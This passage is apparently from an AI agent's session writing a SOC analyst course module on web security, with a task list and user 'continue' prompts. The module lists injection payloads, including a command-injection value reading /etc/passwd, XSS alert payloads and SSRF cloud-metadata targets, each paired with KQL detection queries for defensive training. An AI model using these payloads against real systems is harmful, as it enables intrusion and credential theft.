to extract data | WAF: UNION SELECT patterns |\n| **Blind (Boolean)** | True/False inference (no errors) | WAF: ' OR 1=1, ' AND 1=2 patterns |\n| **Blind (Time-based)** | SLEEP/WAITFOR DELAY → timing | WAF: SLEEP(5), WAITFOR DELAY '0:0:5' |\n| **Out-of-band (OOB)** | DNS/HTTP exfil (xp_cmdshell, LOAD_FILE) | DNS logs, Proxy (internal → external) |\n| **Second-order** | Stored payload → triggered later | App logs (delayed execution) |\n\n**Detection (WAF/Proxy)**:\n```kql\n// Common SQLi patterns\nWebLogs\n| where cs_uri_query has_any (\"'\", \"\\\"\", \"UNION\", \"SELECT\", \"INSERT\", \"UPDATE\", \"DELETE\", \"DROP\", \"OR 1=1\", \"'--\", \"';--\", \"xp_cmdshell\", \"sp_executesql\")\n| or cs_uri_query matches regex @\"(%27|%22|%3B|%2D%2D|%55%4E%49%4F%4E|%53%45%4C%45%43%54)\"\n| where cs_method in (\"GET\", \"POST\")\n| summarize Count=count(), Payloads=make_set(cs_uri_query) by c_ip, cs_host, cs_uri_stem, bin(TimeGenerated, 1h)\n| where Count > 5\n```\n\n### 2. NoSQL Injection\n**Mechanism**: MongoDB/DocumentDB operators in JSON input.\n```javascript\n// Vulnerable\ndb.users.find({ username: req.body.user, password: req.body.pass });\n// Attack: { \"username\": \"admin\", \"password\": { \"$gt\": \"\" } }\n// Result: Bypass auth\n```\n**Operators**: `$gt`, `$ne`, `$regex`, `$where`, `$exists`, `$nin`, `$in`\n**Detection**: JSON payloads with MongoDB operators in API calls.\n\n### 3. Command Injection (OS Command)\n**Mechanism**: User input passed to system shell.\n```python\n# Vulnerable\nos.system(\"ping \" + user_input)\n# Attack: 8.8.8.8; cat /etc/passwd\n# Result: Ping + password file\n```\n**Payloads**: `;`, `&&`, `||`, `|`, `` `cmd` ``, `$(cmd)`, `\\n`, `\\r`\n**Detection**: Shell metacharacters in input fields, WAF rules, EDR on web server.\n\n### 4. LDAP Injection\n**Mechanism**: User input in LDAP filter.\n```java\n// Vulnerable\nString filter = \"(uid=\" + userInput + \")\";\n// Attack: *)(userPassword=*)\n// Result: (uid=*)(userPassword=*)\n```\n**Detection**: LDAP metacharacters `(`, `)`, `*`, `&`, `|`, `!`, `=`, `~` in auth/search params.\n\n### 5. XPath Injection\n**Mechanism**: User input in XPath query.\n```xml\n// Vulnerable\n/users/user[username='input' and password='input']\n// Attack: ' or '1'='1\n// Result: Bypass auth\n```\n**Detection**: XPath syntax (`'`, `\"`, `or`, `and`, `//`, `/*`) in XML API params.\n\n---\n\n## 20.4 Cross-Site Scripting (XSS)\n\n### Types\n| Type | Mechanism | Impact | Detection |\n|------|-----------|--------|-----------|\n| **Reflected** | Payload in URL/param → reflected in response | Victim clicks malicious link | WAF: `<script>`, `javascript:`, `onerror=` in URL/query |\n| **Stored** | Payload saved in DB → served to all viewers | Persistent, all visitors | App logs: Stored payload in DB fields (comments, profiles) |\n| **DOM-based** | Client-side JS modifies DOM unsafely | No server interaction | Hard for WAF; CSP, CSP report-uri |\n| **Mutated** | Browser mutates payload (encoding bypass) | Bypass filters | Hard; Browser behavior analysis |\n\n### Common Payloads\n```html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\njavascript:alert(1)\n<iframe src=javascript:alert(1)>\n<body onload=alert(1)>\n<input autofocus onfocus=alert(1)>\n<details open ontoggle=alert(1)>\n```\n\n### Detection (WAF/Proxy)\n```kql\nWebLogs\n| where cs_uri_query has_any (\"<script>\", \"javascript:\", \"onerror=\", \"onload=\", \"alert(\", \"document.cookie\", \"eval(\", \"onfocus=\", \"ontoggle=\", \"onmouseover=\")\n| or cs_uri_query matches regex @\"(%3Cscript%3E|javascript%3A|onerror%3D|onload%3D|alert%28)\"\n| where cs_method in (\"GET\", \"POST\")\n| summarize Count=count(), Payloads=make_set(cs_uri_query) by c_ip, cs_host, cs_uri_stem, bin(TimeGenerated, 1h)\n| where Count > 5\n```\n\n---\n\n## 20.5 Broken Access Control — BOLA / IDOR\n\n### BOLA (Broken Object Level Authorization)\n**Mechanism**: User accesses object they don't own via direct reference.\n```\nGET /api/orders/12345  → Returns order 12345 (attacker's)\nGET /api/orders/12346  → Returns order 12346 (victim's!) — No authz check\n```\n\n### IDOR (Insecure Direct Object Reference)\n**Mechanism**: Predictable identifiers (sequential IDs, UUIDs) without authorization.\n```\n/api/users/1001/profile\n/api/users/1002/profile  → Other user's data\n/api/documents/inv-2024-001.pdf\n/api/documents/inv-2024-002.pdf  → Other invoice\n```\n\n### Detection\n```kql\n// Unusual access patterns: One user accessing many object IDs\nApiLogs\n| where cs_uri_stem matches regex @\"/api/.*/\\d+\"\n| extend ObjectId = extract(@\"/api/.*/(\\d+)\", 1, cs_uri_stem)\n| summarize UniqueObjects=dcount(ObjectId), Requests=count() by c_ip, cs_username, cs_uri_stem, bin(TimeGenerated, 1h)\n| where UniqueObjects > 20  // One user accessing many objects\n```\n\n---\n\n## 20.6 Server-Side Request Forgery (SSRF)\n\n### Mechanism\nServer makes requests to attacker-controlled or internal destinations.\n```python\n# Vulnerable: User-supplied URL fetched by server\nresponse = requests.get(user_supplied_url)\n```\n\n### Targets\n| Target | URL | Impact |\n|--------|-----|--------|\n| **Cloud Metadata** | `http://169.254.169.254/latest/meta-data/` (AWS) | IAM credentials, Instance info |\n| | `http://metadata.google.internal/computeMetadata/v1/` (GCP) | Service account tokens |\n| | `http://169.254.169.254/metadata/instance` (Azure) | Managed identity tokens |\n| **Internal Services** | `http://localhost:8080/admin` | Admin panels, Debug endpoints |\n| | `http://internal-db:5432` | Database access |\n| **Port Scanning** | `http://10.0.0.1:22`, `http://10.0.0.1:3306` | Internal reconnaissance |\n| **File Protocol** | `file:///etc/passwd` | Local file read |\n\n### Detection\n```kql\n// Outbound from web server to internal/metadata\nWebLogs\n| where cs_host in (web_server_ips)\n| where cs_uri_query has_any (\"169.254.169.254\", \"metadata.google.internal\", \"metadata.azure.com\", \"127.0.0.1\", \"localhost\", \"file://\")\n| or cs_referer has_any (\"169.254.169.254\", \"metadata.\", \"127.0.0.1\", \"localhost\")\n| project TimeGenerated, c_ip, cs_host, cs_method, cs_uri_stem, cs_uri_query, cs_referer, sc_status\n```\n\n---\n\n## 20.7 Deserialization / RCE\n\n### Java (Apache Commons, Spring, etc.)\n```java\n// Vulnerable: ObjectInputStream.readObject()\nObjectInputStream ois = new ObjectInputStream(inputStream);\nObject obj = ois.readObject();  // Gadget chain → RCE\n```\n**Gadget Chains**: CommonsCollections, Spring, JRE, JSON libraries (Jackson, Gson).\n\n### .NET (BinaryFormatter, Json.NET, etc.)\n```csharp\n// Vulnerable\nBinaryFormatter formatter = new BinaryFormatter();\nObject obj = formatter.Deserialize(stream);  // TypeConfuseDelegate, etc.\n```\n\n### PHP (unserialize)\n```php\n// Vulnerable\nunserialize($_COOKIE['data']);  // POP chains → RCE\n```\n\n### Python (pickle)\n```python\n# Vulnerable\npickle.loads(user_data)  # __reduce__ → RCE\n```\n\n### Detection\n```kql\n// Serialized payloads in traffic\nWebLogs\n| where cs_request_body has_any (\"ACED0005\", \"rO0\", \"sr \", \"java.lang\", \"System.Object\", \"pickle\", \"O:8:\\\"stdClass\\\"\")\n| or cs_uri_query has_any (\"ACED0005\", \"rO0\", \"pickle\")\n| project TimeGenerated, c_ip, cs_host, cs_method, cs_uri_stem, cs_request_body\n```\n\n---\n\n## 20.8 Authentication & Session Attacks\n\n| Attack | Mechanism | Detection |\n|--------|-----------|-----------|\n| **Brute Force** | Many login attempts | 401/403 spikes, WAF rate limit |\n| **Credential Stuffing** | Breached creds tried | High volume, many IPs, known breach lists |\n| **Session Fixation** | Attacker sets victim's session ID | Same session ID before/after login |\n| **Session Hijacking** | Steal session cookie (XSS, MITM) | Same session from different IP/UA |\n| **JWT Attacks** | `alg: none`, Weak secret, Key confusion | JWT parsing errors, Invalid signatures |\n| **OAuth/SSO Abuse** | Redirect URI manipulation, Token replay | Auth server logs, State parameter missing |\n\n---\n\n## 20.9 Web Security Headers — L1 Checklist\n\n| Header | Purpose | Secure Value |\n|--------|---------|--------------|\n| **Content-Security-Policy (CSP)** | Prevent XSS/injection | `default-src 'self'; script-src 'self' 'nonce-xxx'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'` |\n| **Strict-Transport-Security (HSTS)** | Force HTTPS | `max-age=31536000; includeSubDomains; preload` |\n| **X-Frame-Options** | Prevent clickjacking | `DENY` |\n| **X-Content-Type-Options** | Prevent MIME sniffing | `nosniff` |\n| **Referrer-Policy** | Control referer leakage | `strict-origin-when-cross-origin` |\n| **Permissions-Policy** | Control browser features | `geolocation=(), microphone=(), camera=()` |\n| **Cross-Origin-Opener-Policy (COOP)** | Isolate browsing context | `same-origin` |\n| **Cross-Origin-Resource-Policy (CORP)** | Control resource loading | `same-origin` |\n| **X-XSS-Protection** | Legacy XSS filter | `1; mode=block` (deprecated, use CSP) |\n\n---\n\n## 20.10 Web Security Logging — What L1 Needs\n\n| Log Source | Key Fields | Retention |\n|------------|------------|-----------|\n| **WAF** | Timestamp, Client IP, Rule ID, Action (Block/Allow/Monitor), Attack Type, Payload, Request/Response | 90 days+ |\n| **Proxy/Load Balancer** | Client IP, Host, Method, URL, Status, Bytes, Latency, User-Agent, TLS info | 90 days+ |\n| **Web Server (IIS/Nginx/Apache)** | Client IP, Method, URL, Status, Referer, User-Agent, Server IP, Latency | 30-90 days |\n| **Application** | User ID, Action, Object ID, Result, Business Context, IP, Session ID | 1 year+ |\n| **Database Audit** | User, Query, Table, Rows Affected, Duration, Error | 1 year+ |\n| **CDN** | Edge IP, Client IP, Cache Status, Status, Bytes, Latency, Country | 30 days |\n\n---\n\n## 20.11 Interview Questions for This Module\n\n1. **What is the OWASP Top 10 and which are most relevant for L1 detection?**\n   - A01 Broken Access Control, A03 Injection, A07 Auth Failures, A10 SSRF — detectable via WAF/Proxy/App logs.\n\n2. **Explain the difference between Reflected, Stored, and DOM-based XSS.**\n   - Reflected: Payload in request → reflected in response. Stored: Payload saved in DB → served later. DOM-based: Client-side JS modifies DOM unsafely.\n\n3. **What is SQL Injection and how do you detect it in WAF/proxy logs?**\n   - User input concatenated into SQL query. Detect: `'`, `UNION`, `SELECT`, `OR 1=1`, `xp_cmdshell`, `--` in query params/body.\n\n4. **What is SSRF and what are the high-value targets?**\n   - Server makes requests to attacker-controlled/internal targets. Targets: Cloud metadata (169.254.169.254), Internal services, Port scanning, File protocol.\n\n5. **What is BOLA/IDOR and how do you detect it?**\n   - Accessing objects without authorization via direct reference. Detect: One user accessing many object IDs sequentially.\n\n6. **What are the critical security headers every web app should have?**\n   - CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, COOP, CORP.\n\n7. **How do you detect deserialization attacks in web traffic?**\n   - Serialized payload signatures: Java (`ACED0005`/`rO0`), .NET (BinaryFormatter), PHP (`O:8`), Python (`pickle`) in request body/params.\n\n8. **What is the difference between In-band and Blind SQL Injection?**\n   - In-band: Results/errors returned in response (Error-based, Union-based). Blind: No direct output; Boolean (true/false) or Time-based (SLEEP).\n\n9. **What logs should you collect for web security and what are key fields?**\n   - WAF (Rule ID, Action, Payload), Proxy (Client IP, Host, Method, URL, Status, UA), App (User ID, Action, Object, Business Context), DB (User, Query, Table).\n\n10. **How does JWT authentication work and what attacks exist?**\n    - Header.Payload.Signature. Attacks: `alg: none`, Weak secret (brute force), Key confusion (RS256→HS256), Token replay, Missing expiration.\n\n---\n\n## 20.12 Study Checklist for Module 20\n\n- [ ] List OWASP Top 10 2021 with detection relevance\n- [ ] Explain 5 SQLi types (Error, Union, Boolean Blind, Time Blind, OOB)\n- [ ] Detect NoSQLi, Command Injection, LDAPi, XPath Injection patterns\n- [ ] Distinguish Reflected, Stored, DOM, Mutated XSS with payloads\n- [ ] Explain BOLA vs IDOR with detection query\n- [ ] List 8 SSRF targets (Cloud metadata, Internal services, Port scan, File protocol)\n- [ ] Identify deserialization payloads (Java, .NET, PHP, Python)\n- [ ] List 6 Auth/Session attacks with detection\n- [ ] Recite 9 critical security headers with secure values\n- [ ] Define web log sources with key fields and retention\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 21 — Linux Security*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/20-web-security.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 36.2s)

_Thinking:_

Good, Module 20 is done. Now let me continue with Module 21 - Linux Security.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "in_progress"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "in_progress",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 422.8s)

_Thinking:_



_Thinking:_



_Thinking:_



_Thinking:_

Now let me create Module 21 - Linux Security.

---

## User

continue

---

## User

continue

---

## Assistant (Build · Nemotron 3 Ultra Free · 146.8s)

_Thinking:_



_Thinking:_

The user wants me to continue creating the modules. I was working on Module 21 - Linux Security. Let me continue with that and then proceed through the remaining modules.

---

